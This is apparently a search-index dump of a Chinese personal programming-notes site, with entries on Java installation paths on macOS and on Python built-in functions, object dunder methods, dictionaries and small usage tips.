/Library/Java/JavaVirtualMachines/jdk-20.0.1.jdk 看一下链接后的内容: ls /Library/Java/JavaVirtualMachines\njdk-20.0.1.jdk                jdk1.8.0_311.jdk        temurin-8.jdk 测试: /usr/bin/java --version\njava 20.0.1 2023-04-18\nJava(TM) SE Runtime Environment (build 20.0.1+9-29)\nJava HotSpot(TM) 64-Bit Server VM (build 20.0.1+9-29, mixed mode, sharing) 注解 Mac有内置的获取JAVA_HOME的指令: /usr/libexec/java_home Mac下的卸载 同理, /usr/bin/java 不能被删除, 不用管, 直接更新一下 profile 配置的环境变量(看当初安装配置的时候设置在哪),\n然后删除 /Library/Java/JavaVirtualMachines 下面相关版本即可.\n貌似可以不用删? 看起来找版本是从高到低的, 还没试过, 之前的两个11版本被我删完了, 1.8的貌似没有被自动识别, 以后有机会在试.","tags":"后端","url":"/yq-docs-rear-end-java-Install.html","loc":"/yq-docs-rear-end-java-Install.html"},{"title":"一些备忘","text":"MacOs查看安装路径: /usr/libexec/java_home -V Java运行时环境（JRE）","tags":"后端","url":"/yq-docs-rear-end-java-Some-memo.html","loc":"/yq-docs-rear-end-java-Some-memo.html"},{"title":"chr","text":"chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。 chr(i) i: 十进制/十六进制 整数 返回值是当前整数对应的 ASCII 字符: >>>print chr(0x30), chr(0x31), chr(0x61)   # 十六进制\n0 1 a\n>>> print chr(48), chr(49), chr(97)         # 十进制\n0 1 a","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-CHR.html","loc":"/yq-docs-rear-end-python-Built--in-function-CHR.html"},{"title":"cmp","text":"注解 Python3 中已经移除, 可以使用 operator 模块: operator cmp(x,y) 函数用于比较2个对象，如果 x < y 返回 -1, 如果 x == y 返回 0, 如果 x > y 返回 1 cmp( x, y ) 如果 x < y 返回 -1, 如果 x == y 返回 0, 如果 x > y 返回 1。","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-CMP.html","loc":"/yq-docs-rear-end-python-Built--in-function-CMP.html"},{"title":"dict","text":"生成一个字典 支持将两个值的迭代转换为字典: In [1]: a = [(1, 2), (2, 3), (3, 4)]\n\nIn [2]: dict(a)\nOut[2]: {1: 2, 2: 3, 3: 4}\n\nIn [3]: dict(tuple(a))\nOut[3]: {1: 2, 2: 3, 3: 4}\n\nIn [4]: 合并多个字典 这里要注意 **参数关键字必须是字符串: dict(dict1, **dict2, **dict3)","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-DICT.html","loc":"/yq-docs-rear-end-python-Built--in-function-DICT.html"},{"title":"filter","text":"filter() 函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。 Python2.7 返回列表 Python3.x 返回迭代器对象 filter(function, iterable) function -- 判断函数。\niterable -- 可迭代对象。 该接收两个参数，第一个为函数，第二个为序列，\n序列的每个元素作为参数传递给函数进行判断，然后返回 True 或 False，最后将返回 True 的元素放到新列表中。 过滤出列表中的所有奇数: def is_odd(n):\n    return n % 2 == 1\n\nnewlist = filter(is_odd, [1, 2, 3, 4, 5, 6, 7, 8, 9, 10])\nprint(newlist)","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-Filter.html","loc":"/yq-docs-rear-end-python-Built--in-function-Filter.html"},{"title":"iter","text":"创建一个迭代器 iter 函数一个鲜为人知的特性是它接受一个可选的 callable 对象和一个标记 (结 尾) 值作为输入参数。\n当以这种方式使用的时候，它会创建一个迭代器，这个迭代器会 不断调用 callable 对象直到返回值和标记值相等为止。 例: >>> import sys\n>>> f = open('/etc/passwd')\n>>> for chunk in iter(lambda: f.read(10), ''):\n...   n = sys.stdout.write(chunk)\n...\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico ...\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-ITER.html","loc":"/yq-docs-rear-end-python-Built--in-function-ITER.html"},{"title":"ord","text":"ord() 函数是 chr() 函数（对于8位的ASCII字符串, 见 chr ）\n或 unichr() 函数（对于Unicode对象）的配对函数，\n它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，\n如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。 ord(c) c: 字符 返回值是对应的十进制整数: >>>ord('a')\n97\n>>> ord('b')\n98\n>>> ord('c')\n99","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-ORD.html","loc":"/yq-docs-rear-end-python-Built--in-function-ORD.html"},{"title":"str/repr","text":"str 与 repr 函数的效果差不多, 所以就放到一起说了. 对于继承了 object 的类(新式类)而言, 可以通过重写: __str__()\n__repr__() 来更改默认行为. 一般而言, repr 用于 开发/测试, str 用于正式场景 若没有定义 __str__ 而定义了 __repr__ , 则使用 str, 会调用 __repr__ 可以看看默认的例子: In [7]: @dataclass\n ...: class MTest(object):\n ...:     name: str\n ...:     age: int\n ...:\n\nIn [8]: m = MTest('tt', 12)\n\nIn [9]: str(m)\nOut[9]: \"MTest(name='tt', age=12)\"\n\nIn [10]: repr(m)\nOut[10]: \"MTest(name='tt', age=12)\" 可以发现默认实现的没有什么差别. 这时候如果需要不一致, 就需要自己重写了... 理想的情况: In [14]: import datetime\n\nIn [15]: d = datetime.datetime.now()\n\nIn [16]: d\nOut[16]: datetime.datetime(2023, 4, 13, 9, 37, 55, 887361)\n\nIn [17]: str(d)\nOut[17]: '2023-04-13 09:37:55.887361'\n\nIn [18]: repr(d)\nOut[18]: 'datetime.datetime(2023, 4, 13, 9, 37, 55, 887361)'","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-Str,-REPR.html","loc":"/yq-docs-rear-end-python-Built--in-function-Str,-REPR.html"},{"title":"type","text":"一个参数 一个参数返回类型 三个参数(或者大于1) 以第一个参数为类名, 第二个参数为父类元祖, 第三个参数为赋值 用例: # coding: utf-8 class A ( object ): a = 1 class B ( object ): b = 2 def something (): print ( 'some' ) c = type ( A ), type ( A ()) d = type ( 'D' , ( A , B ), { 'something' : something }) print ( '一个参数' , c ) print ( '三个参数' , d , d . __dict__ , d . a , d . b ) # 输出 # 一个参数 (<class 'type'>, <class '__main__.A'>) # 三个参数 <class '__main__.D'> {'something': <function something at 0x109e410d0>, '__module__': '__main__', '__doc__': None} 1 2","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-Type.html","loc":"/yq-docs-rear-end-python-Built--in-function-Type.html"},{"title":"vars","text":"获取局部变量表, 或者对象属性. vars([object]) 返回对象object的属性和属性值的字典对象，\n如果没有参数，就打印当前调用位置的属性和属性值 类似 locals()。","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-Vars.html","loc":"/yq-docs-rear-end-python-Built--in-function-Vars.html"},{"title":"__str__","text":"当使用print输出对象的时候，只要自己定义了 __str__(self) 方法，那么就会打印从在这个方法中return的数据 比如: class Cat:\n    def __str__(self):\n        return \"猫\"\n\nt = Cat()\nprint(t)\n\n# 猫","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-__Str__.html","loc":"/yq-docs-rear-end-python-Built--in-function-__Str__.html"},{"title":"any","text":"any() 函数用于判断给定的可迭代参数 iterable 是否全部为 False 元素除了是 0、空、FALSE 外都算 TRUE。 函数等价于: def any(iterable):\n    for element in iterable:\n        if element:\n            return True\n    return False any(iterable) iterable: 元组或列表 如果都为空、0、false，则返回false，\n如果不都为空、0、false，则返回true","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-any.html","loc":"/yq-docs-rear-end-python-Built--in-function-any.html"},{"title":"async for","text":"异步迭代器. 普通对象的for循环只需要实现 __iter__ 即可 对于 async for而言, 若需要支持, 需要实现 __aiter__ 返回一个异步迭代器（asynchronous iterator）对象;\n若需要对象本身就是一个迭代器. 还需要实现 __anext__ , 返回一个awaitable类型的值(异步迭代器对象); 例: class AsyncIteratorWrapper:\n    def __init__(self, obj):\n        self._it = iter(obj)\n\n    def __aiter__(self):\n        return self\n\n    async def __anext__(self):\n        try:\n            value = next(self._it)\n        except StopIteration:\n            raise StopAsyncIteration\n        return value\n\nasync for letter in AsyncIteratorWrapper(\"abc\"):\n    print(letter)","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-async_For.html","loc":"/yq-docs-rear-end-python-Built--in-function-async_For.html"},{"title":"bytearray","text":"bytearray() 方法返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 <= x < 256。 class bytearray([source[, encoding[, errors]]]) source: 如果 source 为整数，则返回一个长度为 source 的初始化数组；\n如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列；\n如果 source 为可迭代类型，则元素必须为[0 ,255] 中的整数；\n如果 source 为与 buffer 接口一致的对象，则此对象也可以被用于初始化 bytearray。\n如果没有输入任何参数，默认就是初始化数组为0个元素。 返回值: 返回新字节数组。 bytearray() 的使用方法: >>>bytearray()\nbytearray(b'')\n>>> bytearray([1,2,3])\nbytearray(b'\\x01\\x02\\x03')\n>>> bytearray('runoob', 'utf-8')\nbytearray(b'runoob')\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-bytearray.html","loc":"/yq-docs-rear-end-python-Built--in-function-bytearray.html"},{"title":"divmod","text":"python divmod() 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a // b, a % b) divmod(a, b) a: 数字\nb: 数字 例: >>>divmod(7, 2)\n(3, 1)\n>>> divmod(8, 2)\n(4, 0)\n>>> divmod(1+2j,1+0.5j)\n((1+0j), 1.5j)","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-divmod.html","loc":"/yq-docs-rear-end-python-Built--in-function-divmod.html"},{"title":"enumerate","text":"enumerate() 函数返回的是一个 enumerate 对象实例，它是一个迭代器，返回连 续的包含一个计数和一个值的元组，\n元组中的值通过在传入序列上调用 next() 返回。 接受一个参数作为起始序号, 默认为0: >>> my_list = ['a', 'b', 'c']\n>>> for idx, val in enumerate(my_list, 1):\n...   print(idx, val)\n...\n1a\n2b\n3c","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-enumerate.html","loc":"/yq-docs-rear-end-python-Built--in-function-enumerate.html"},{"title":"format","text":"有个功能是字符串对齐: format('ssd', '>20')\nOut[24]: '                 ssd'","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-format.html","loc":"/yq-docs-rear-end-python-Built--in-function-format.html"},{"title":"max","text":"max() 函数返回有最大值的项目，或者 iterable 中有最大值的项目。\n如果值是字符串，则按字母顺序进行比较。 max(iterable, key) key用于当 iterable 中元素也为 iterable 时, 定义比较的键/元素","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-max.html","loc":"/yq-docs-rear-end-python-Built--in-function-max.html"},{"title":"min","text":"min() 函数返回值最小的项目，或 iterable 中值最小的项目。\n如果值是字符串，则按字母顺序进行比较。 min(iterable, key) key用于当 iterable 中元素也为 iterable 时, 定义比较的键/元素","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-min.html","loc":"/yq-docs-rear-end-python-Built--in-function-min.html"},{"title":"open","text":"python open() 函数用于打开一个文件，创建一个 file 对象，相关的方法才可以调用它进行读写。 open(name[, mode[, buffering]]) name: 一个包含了你要访问的文件名称的字符串值。 mode: mode 决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读(r)。 buffering: 如果 buffering 的值被设为 0，就不会有寄存。如果 buffering 的值取 1，访问文件时会寄存行。\n如果将 buffering 的值设为大于 1 的整数，表明了这就是的寄存区的缓冲大小。如果取负值，寄存区的缓冲大小则为系统默认。 newline: str = None 指定换行符转换模式, 只对文本文件有效. 默认值为None。该参数在文本模式下使用，可以控制读取或写入文本文件时处理换行符的方式。 具体而言，当newline参数为None时，将根据操作系统来自动处理换行符。\n在Windows操作系统上，文本文件的换行符通常是rn，而在Unix/Linux操作系统上，则通常是n。\n当newline参数为None时，在Windows上读取文件时，rn会被自动转换为n，在Unix/Linux上读取文件时，n则不做任何转换。 另一方面，当newline参数设置为其他字符串值（例如\"\"或\"n\"）时，它将指定换行符的显式表示，并且不进行任何自动转换。\n例如，如果您想要强制使用Unix风格的换行符，则可以将newline参数设置为\"n\"，这样无论在哪个操作系统下打开文件，都将始终使用n作为换行符。 有以下几种可选值： None：表示使用系统默认的换行符。在Windows上是rn，在Unix/Linux/macOS上是n。 \"\"（空字符串）：表示不将任何字符解释为换行符。 \"n\"：表示只将n视为有效换行符。这相当于Unix/Linux/macOS上的默认行为。 \"r\"：表示只将r视为有效换行符。这是非常罕见的情况。 \"rn\"：表示将rn视为有效换行符。这相当于Windows上的默认行为。 请注意，在新版本的Python中，newline参数也可以设置为其他自定义字符串，但这些字符串必须要能够被正确地解释为换行符。 当打开一个文本文件时，如果newline参数不是None，那么读取和写入操作将会根据指定的换行符进行处理。\n例如，如果newline参数设置为\"n\"，\n则在读取文件时，所有rn序列都将被视为单个换行符n，\n而在写入文件时，所有n都将被转换为rn序列。 不同模式打开文件的完全列表： 模式 描述 t 文本模式 (默认)。 x 写模式，新建一个文件，如果该文件已存在则会报错。 b 二进制模式。 打开一个文件进行更新(可读可写)。 U 通用换行模式（不推荐）。 r 以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。 rb 以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。 r+ 打开一个文件用于读写。文件指针将会放在文件的开头。 rb+ 以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。 w 打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。 wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。 w+ 打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。 wb+ 以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。 a 打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。 ab 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。 a+ 打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。 ab+ 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。 x 文件不存在才能写入 file 对象方法 file.read([size]) size 未指定则返回整个文件，如果文件大小 >2 倍内存则有问题，f.read()读到文件尾时返回\"\"(空字串)。 file.readline() 返回一行。 file.readlines([size]) 返回包含size行的列表, size 未指定则返回全部行。 for line in f: print line 通过迭代器访问。 f.write(\"hello\\n\") 如果要写入字符串以外的数据,先将他转换为字符串。 f.tell() 返回一个整数,表示当前文件指针的位置(就是到文件头的字节数)。 f.seek(偏移量,[起始位置])： 用来移动文件指针 偏移量: 单位为字节，可正可负 起始位置: 0 - 文件头, 默认值; 1 - 当前位置; 2 - 文件尾 f.close() 关闭文件 f.readinto(buffer) 将文件读取到预先分配的缓冲中 返回值为读取的字节数 实例 测试文件 test.txt，内容如下: RUNOOB1\nRUNOOB2\n\n>>>f = open('test.txt')\n>>> f.read()\n\n'RUNOOB1\\nRUNOOB2\\n'","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-open.html","loc":"/yq-docs-rear-end-python-Built--in-function-open.html"},{"title":"pow","text":"pow() 方法返回 xy（x 的 y 次方） 的值。 math 模块中也提供了这个函数 math 模块 pow() 方法的语法: import math math . pow ( x , y ) 内置的 pow() 方法 pow ( x , y [, z ]) 函数是计算 x 的 y 次方，如果 z 在存在，则再对结果进行取模，其结果等效于: pow(x,y) % z 注解 pow() 通过内置的方法直接调用， 内置方法会把参数作为整型 ，而 math 模块则会把参数转换为 float 。","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-pow.html","loc":"/yq-docs-rear-end-python-Built--in-function-pow.html"},{"title":"print","text":"这个本来不用说的, 但是想了想还是记录一下 注解 其实大多属于字符串输出本身的 输出指定行长度, 可以使用 {:长度} 形式;\n比如输出123, 长度为40: In [3]: \"|{:40}|\".format(\"123\")\nOut[3]: '|123                                     |'\n\nIn [4]: f\"|{'123':40}|\"\nOut[4]: '|123                                     |' print与sys.stdout.write sys.stdout.write() 只能输出一个字符串str，而 print() 可以输出多个值，数据类型多样。 print(obj) 实际上是调用 sys.stdout.write(obj+'\\n') ，因此print在打印时会自动加个换行符。","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-print.html","loc":"/yq-docs-rear-end-python-Built--in-function-print.html"},{"title":"round","text":"round() 方法返回浮点数x的四舍五入值。 round( x [, n]  ) x -- 数值表达式。\nn -- 数值表达式，表示从小数点位数。 返回浮点数x的四舍五入值。 不过有一个坑. 正常情况不是数学意思上的四舍五入而是四舍六入 在 Python2 中, 如果n的后一位为 5 时, 最终返回值为距离0远的一边; 在 Python3 中, 如果n的后一位为 5 时, 最终返回值会保留到偶数的一边.\n如: round(1.5)\nOut[6]: 2\nround(0.5)\nOut[7]: 0 另外还有一个情况: round(2.355, 2)\nOut[3]: 2.35 不管是哪个版本, 理论上都应该是是 2.36 的,\n但是由于精度问题, 会导致机器内部实际表示的数值比看到的值要小,\n以至于出现这种情况, 并不是bug","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-round.html","loc":"/yq-docs-rear-end-python-Built--in-function-round.html"},{"title":"slice","text":"切片操作 slice() 函数返回 slice 对象（切片）。 slice 对象用于指定如何对序列进行裁切。\n您可以指定在哪里开始裁切以及在哪里结束裁切。\n您还可以指定步进，例如只切每隔一个项目。 slice(start, end, step) start: int = 0 指定在哪个位置开始裁切 end: int 指定在哪个位置结束裁切 step: int = 1 指定裁切的步长 支持有趣的操作: >>> items = [0, 1, 2, 3, 4, 5, 6]\n>>> a = slice(2, 4)\n>>> items[2:4]\n[2, 3]\n>>> items[a]\n[2, 3]\n>>> items[a] = [10,11]\n>>> items\n[0, 1, 10, 11, 4, 5, 6]\n>>> del items[a]\n>>> items\n[0, 1, 4, 5, 6] 可以分别调用它的 a.start , a.stop , a.step 属性 来获取更多的信息。比如: >>> a = slice(5, 50, 2)\n>>> a.start\n5\n>>> a.stop\n50\n>>> a.step 2\n>>> 还能通过调用切片的 indices(size) 方法将它映射到一个确定大小的序 列上，\n这个方法返回一个三元组 (start, stop, step) ，所有值都会被合适的缩小以 满足边界限制，\n从而使用的时候避免出现 IndexError 异常。比如: >>> s = 'HelloWorld'\n>>> a.indices(len(s))\n(5, 10, 2)\n>>> for i in range(*a.indices(len(s))): ... print(s[i])\n...\nW\nr\nd\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-slice.html","loc":"/yq-docs-rear-end-python-Built--in-function-slice.html"},{"title":"sorted","text":"对所有可迭代的对象进行排序操作 sort 与 sorted 区别： sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。 list 的 sort 方法返回的是对已经存在的列表进行操作，无返回值. 内建函数 sorted 方法返回的是一个新的 list，而不是在原来的基础上进行的操作。 sorted(iterable, cmp=None, key=None, reverse=False) iterable: 可迭代对象。 cmp: 比较的函数，这个具有两个参数，参数的值都是从可迭代对象中取出，\n此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0。 key: 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。 reverse: 排序规则，reverse = True 降序 ， reverse = False 升序（默认）。","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-sorted.html","loc":"/yq-docs-rear-end-python-Built--in-function-sorted.html"},{"title":"with","text":"with相当于 try catch finnally语句 自定义的with语句, 需要实现: # coding: utf-8\n\nclass TW(object):\n\n  # with包含初始化时执行, 返回值给到语句定义的as别名\n  def __enter__(self):\n    return 999\n\n  # 出现异常或者正常结束时候执行\n  # 返回值为True时, 不抛出异常, 否则正常抛出异常\n  def __exit__(self, exc_type, exc_val, exc_tb):\n    if exc_tb:\n      print(exc_type, exc_val, exc_tb)\n    return True\n\nwith TW() as t:\n  print(t)\n  raise ValueError('error test') async with语句 异步上下文管理器. 用于异步编程. 与 with 不同的是,\n如果要实现异步的调用, 需要实现 __aenter__ 与 __aexit__ 方法: class AsyncContextManager:\n    async def __aenter__(self):\n        await log('entering context')\n\n    async def __aexit__(self, exc_type, exc, tb):\n        await log('exiting context') 这时就可以异步调用: async with AsyncContextManager():\n  ...","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-with.html","loc":"/yq-docs-rear-end-python-Built--in-function-with.html"},{"title":"字典操作","text":"dict() 返回一个字典 dict.fromkeys(seq[, value]) seq: 字典键值列表。 value: 可选参数, 设置键序列（seq）的值，默认为 None。 Python 字典 fromkeys() 函数用于创建一个新字典，\n以序列 seq 中元素做字典的键，value 为字典所有键对应的初始值。 字典的一些说明 Python3.7之后, 字典的遍历是有序的(通过使用一个排序过的双链表来保存键值对实现),\n不过, 字典在插入时仍然无序, 有序性仅体现在遍历和排序时. 使用sorted排序 技巧 仅针对Python3.7 之后的版本 测试代码: data = {\n    'a': 1,\n    'b': 2,\n    'outer': 3,\n    'c': 4\n}\nprint('origin ========')\nfor one in data:\n    print(one)\n\ndata_new = sorted(data, key=lambda o: o != 'outer', reverse=False)\n\nprint('after sort ========')\nfor one in data_new:\n    print(one) 输出: origin ========\na\nb\nouter\nc\nafter sort ========\nouter\na\nb\nc 这里我没有弄明白为什么 o != 'outer' 结果是放在最前面,\n而 o == 'outer' , outer在最后. 合并字典的方式 注意 **a2 这里， key不能为 非str, 因为是当做参数传递解析的: a1, a2 = dict(), dict()\nb = dict(a1, **a2)","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Dictionary.html","loc":"/yq-docs-rear-end-python-Concept-Dictionary.html"},{"title":"元类","text":"默认情况下，类是使用 type() 来构建的。类体会在一个新的命名空间内执行，\n类名会被局部绑定到 type(name, bases, namespace) 的结果。 类创建过程可通过在定义行传入 metaclass 关键字参数，或是通过继承一个包含此参数的现有类来进行定制。\n在以下示例中，MyClass 和 MySubclass 都是 Meta 的实例: class Meta(type):\n    pass\n\nclass MyClass(metaclass=Meta):\n    pass\n\nclass MySubclass(MyClass):\n    pass","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Meta--category.html","loc":"/yq-docs-rear-end-python-Concept-Meta--category.html"},{"title":"object类","text":"方法 new init getattribute getattr setattr delattr enter exit str class iter getitem setitem __new__ __new__() code: def __new__(cls) -> Any: ... 实例化对象的时候调用, 先执行 __new__() 返回对象实例, 再执行 __init__() 进行定义的初始化操作 用处: 可以重写此方法实现单例, 相对于装饰器实现单例的好处是, 不会有装饰器实现单例的一些bug(暂且说是bug吧, 比如不能继承什么的) __init__ __init__() code: def __init__(self) -> None: ... 实例化对象时的初始化操作, 一般操作实例化时候传进来的值 补充: 有一个名为 __init__.py 的文件, 在某目录根目录下新建此文件, 可以使该目录被识别为python模块 __getattribute__ __getattribute__() code: def __getattribute__(self, name: str) -> Any: ... 当访问实例属性时, 不管是方法还是成员变量, 都会默认调用这个(直接用类名调用不会触发),\n如果没找到 再去调用 __getattr__() 用处: 通过重写此方法实现代理 __getattr__() code: def __getattr__(self, name: str) -> None: ... 当调用实例属性时, 没找到就调用, 默认再没有就报错, 可以通过重写此方法定义实例额外属性, 也可用作不冲突代理 也可以直接 getattr(obj, name) 获取实例属性 再次注意: __getattr__ 方法是在访问 attribute 不存在的时候被调用 __setattr__ __setattr__() code: def __setattr__(self, *args, **kwargs) -> None: ... 与 getattr相对应, setattr是设置属性, getattr是获取属性 __delattr__ __delattr__() code: def __delattr__(self, name: str) -> None: ... 删除实例属性 __enter__/__exit__ __enter__() 和 __exit__() 实现自定义with语句需要重写的方法, with语句进入执行 __enter__(), 执行结束或异常 执行 __exit__(), 注意, enter的返回值是with实例化的值, exit只有返回True时, 才不抛出异常 其他相关使用不做赘述 __str__() code: def __str__(self, *args, **kwargs): ... 设置直接打印实例时的值, 可以理解成将其转换为str类型的值 __class__ __class__() code: @property\ndef __class__(self: _T) -> Type[_T]: ...\n# Ignore errors about type mismatch between property getter and setter\n@__class__.setter\ndef __class__(self, __type: Type[object]) -> None: ...  # type: ignore # noqa: F811 相当于java的get, set方法, 可以更方便的通过 @property 装饰器来访问成员变量 使自身可迭代, 即可使用 for/next 循环. 使自身可以用字典的形式 obj['x'] 来取值. __setitem__ 可与 getitem 一起使用, 不过这个是设置值的. other 待后面补充: def __eq__(self, o: object) -> bool: ...\ndef __ne__(self, o: object) -> bool: ...\ndef __str__(self) -> str: ...\ndef __repr__(self) -> str: ...\ndef __hash__(self) -> int: ...\ndef __format__(self, format_spec: str) -> str: ...\ndef __sizeof__(self) -> int: ...\ndef __reduce__(self) -> Union[str, Tuple[Any, ...]]: ...\ndef __reduce_ex__(self, protocol: int) -> Union[str, Tuple[Any, ...]]: ...\ndef __dir__(self) -> Iterable[str]: ...\ndef __init_subclass__(cls) -> None: ... 类属性 或者说成员变量 __slots__ __slots__: Union[str, Iterable[str]] 默认情况下, python会使用字典保存实例相关的一些属性、 方法, 访问很方便但是会消耗额外内存, 通过重定义此变量, 设置实例字典需要保存的属性, 节约空间 __dict__ __dict__: Dict[str, Any] 实例对象会保存的一些属性, 如上所叙 __doc__ __doc__: Optional[str] 类的使用说明文档定义 __module__ __module__: str 待补充 __annotations__ __annotations__: Dict[str, Any] 待补充","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Object-class.html","loc":"/yq-docs-rear-end-python-Concept-Object-class.html"},{"title":"包/模块结构说明","text":"在官网下载好并安装好后, 可以发现包存放的目录有 Lib 目录存放标准库 Lib/site-packages 目录存放安装的第三方包/模块 Script 目录存放可执行文件, 如python/pip (Unix貌似是 bin) 模块 每一个单独的py文件, 比如main.py, 就是模块 包 包包含了多个模块, 属于一种有组织的结构","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Pack,-module-structure.html","loc":"/yq-docs-rear-end-python-Concept-Pack,-module-structure.html"},{"title":"python命令选项与参数","text":"-m <module> 指定模块 -i 执行结束时打开交互式界面","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Python-command-options-and-parameters.html","loc":"/yq-docs-rear-end-python-Concept-Python-command-options-and-parameters.html"},{"title":"Python线程池及其原理","text":"","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Python-thread-pool-and-its-principle.html","loc":"/yq-docs-rear-end-python-Concept-Python-thread-pool-and-its-principle.html"},{"title":"Python使用技巧/问题","text":"进度条 最原始数字实现: def print_hi():\n  n = 100\n  for i in range(n):\n      for j in range(n):\n          j += i\n      print(f\"{i+1} / {n}\", end='\\r') 效果: 8622 / 10000 百分比进度条: def print_hi():\n  n = 10000\n  for i in range(n):\n      for j in range(n):\n          j += i\n      # print(i)\n      # print(f\"{i+1} / {n}\", end='\\r')\n      print(\"进度·\",\n            f\"|{ '+' * ((i+1) * 100 // n):100}|\",\n            f\"{(i+1) * 100 // n}/%\",\n            end='\\r') 效果 其他第三方进度条库模块: progress tqdm alive-progress 多赋值 普通多赋值: In [10]: product_info = ['apple', '5', 1000]\n\nIn [11]: name, price, num = product_info\n\nIn [12]: name, price, num\nOut[12]: ('apple', '5', 1000)\n\nIn [13]: 如果只需要部分, 其它的任意变量占位即可, 如只需要name: In [13]: name, *_ = product_info\n\nIn [14]: name, _\nOut[14]: ('apple', ['5', 1000]) 技巧 可使用 * 赋值为列表 适用与任何可迭代对象, 如list, str 获取参数列表 函数内部 函数内部 获取, 使用 locals In [1]: def fun1(a, b, c):\n...:     d = 4\n...:     print(locals())\n...:     print(a, b, c)\n...:\n\nIn [2]: fun1(1, 2, 3)\n{'a': 1, 'b': 2, 'c': 3, 'd': 4}\n1 2 3 函数外部 函数外部 获取, 使用 __code__.co_varnames , 只能获取参数名 In [4]: fun1.__code__.co_varnames\nOut[4]: ('a', 'b', 'c', 'd') 或者使用 inspect 模块, 获取形参列表和默认参数, 例: In [8]: import inspect\n\nIn [9]: inspect.getargspec(fun1)\n<ipython-input-9-96541cc6565c>:1: DeprecationWarning: inspect.getargspec() is deprecated since Python 3.0, use inspect.signature() or inspect.getfullargspec()\ninspect.getargspec(fun1)\nOut[9]: ArgSpec(args=['a', 'b', 'c'], varargs=None, keywords=None, defaults=None)\n\nIn [10]: inspect.signature(fun1)\nOut[10]: <Signature (a, b, c)>\n\nIn [11]: inspect.getfullargspec(fun1)\nOut[11]: FullArgSpec(args=['a', 'b', 'c'], varargs=None, varkw=None, defaults=None, kwonlyargs=[], kwonlydefaults=None, annotations={}) 看起来建议使用 getfullargspec 获取的最详细. 技巧 相关 获取函数参数个数(形参个数): In [6]: fun1.__code__.co_argcount\nOut[6]: 3 获取函数参数默认值(元组), 如果有: In [7]: fun1.__defaults__ 关于字典 当字典的元素个数少于1000时，应使用: dData.keys(),dData.items(),dDate.values() 当字典的元素个数超过1000时，为了提高效率，可以使用: dData.iterkeys(),dData.iteritems,dData.itervalues() 当没有把握时，采用第一种keys的方案 keys，items，values会创建新的副本参与元素遍历，安全性更高，\n而iter是迭代器的概念，直接用元素的内存地址指针参与每个元素的遍历 